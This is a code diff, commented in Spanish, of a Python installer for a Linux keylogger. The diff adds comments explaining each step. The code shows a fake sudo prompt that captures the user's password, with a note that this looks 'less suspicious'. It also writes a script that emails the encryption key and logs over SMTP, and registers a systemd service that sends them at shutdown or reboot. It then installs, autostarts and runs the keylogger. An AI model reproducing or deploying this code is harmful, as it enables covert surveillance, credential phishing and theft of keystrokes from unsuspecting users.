@@ -23,13 +23,15 @@ def check_admin():
         print("Este script requiere privilegios de administrador. Por favor, ejecútelo con sudo.")
         exit(1)
 
-# Simula la solicitud de contraseña de administrador (muestra un mensaje similar al de sudo)
+# Simula la solicitud de contraseña de administrador (muestra un mensaje similar al de sudo). Esta parte puede ser omitida ya que no es estrictamente necesaria. De hecho será menos sospechoso ya que está especificamente hecho para un usuario kali.
 def get_admin_password():
     password = getpass.getpass(prompt="Sorry, try again.\n[sudo] password for kali: ")
     return password
 
+# Función que crea el script que se ejecutará por parte del servicio que crearemos después.
 def create_shutdown_script():
     script_apagado = '''
+# Importamos las librerías necesarias para que funcione el script.
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
@@ -39,6 +41,7 @@ import os
 import netifaces
 import time
 
+# Definimos la ruta del directorio donde se guardan los logs y la ruta de la contraseña de cifrado.
 log_dir = "/tmp/logs/"
 key_path = '/tmp/logs/key.txt'
 
@@ -79,10 +82,12 @@ def read_key():
         #print(f"Error al leer la clave: {e}")
         return "Clave no disponible"
 
+# Función principal del script, que manda el correo por SMTP con la contraseña de cifrado como asunto.
 def enviar_correo():
     # Crear el directorio si no existe
     os.makedirs(log_dir, exist_ok=True)
 
+    # Leemos la clave del archivo de texto y la guardamos en una variable para usarla más adelante.
     key_subject = read_key()
 
     # Crear el mensaje
@@ -117,10 +122,12 @@ def enviar_correo():
     except Exception as e:
         #print(f"Error al enviar el correo: {e}")
 
+# Función main.
 if __name__ == "__main__":
     enviar_correo()
 
 '''
+    # Escribimos el código anterior en un archivo.
     destination_path = "/usr/local/bin/shutdownandreboot.py"  # Destino donde se guarda el archivo de keylogger
     try:
         with open(destination_path, 'w') as f:
@@ -129,11 +136,12 @@ if __name__ == "__main__":
     except Exception as e:
         exit(1)
 
-
+# Creamos el servicio que se ejecutará al detectar las señales de apagado, pausa o reinicio.
 def create_shutdownreboot_service():
+    # Ruta del archivo que guardará el servicio.
     service_path = "/etc/systemd/system/shutdownandreboot.service"
 
-    # Contenido del archivo de servicio
+    # Contenido del archivo de servicio. Before define antes de qué servicios se ejecutará. Oneshot indica que se ejecutará el script una vez y se parará. WantedBy implica que los siguientes servicios necesitarán que este otro servicio se haya ejecutado para funcionar.
     service_content = """[Unit]
     Description=Enviar log antes del apagado o reinicio
     DefaultDependencies=no
@@ -194,6 +202,7 @@ if not os.path.exists(log_dir):
     os.makedirs(log_dir)  # Crea el directorio si no existe
     os.chmod(log_dir, 0o777)  # Asigna permisos de escritura
 
+# Guarda la clave generada en un archivo para la posterior posible lectura desde el script de apagado.
 with open('/tmp/logs/key.txt', 'wb') as crypto_key:
     crypto_key.write(key)
 
@@ -319,5 +328,5 @@ copy_keylogger()  # Copia el keylogger al sistema
 setup_autostart()  # Configura el arranque automático
 create_flag()  # Crea la bandera de instalación
 execute_keylogger_immediately()  # Ejecuta el keylogger inmediatamente
-create_shutdown_script()
-create_shutdownreboot_service()
+create_shutdown_script() # Ejecuta la función de creación del script de apagado.
+create_shutdownreboot_service() # Ejecuta la función que crea el servicio definido.
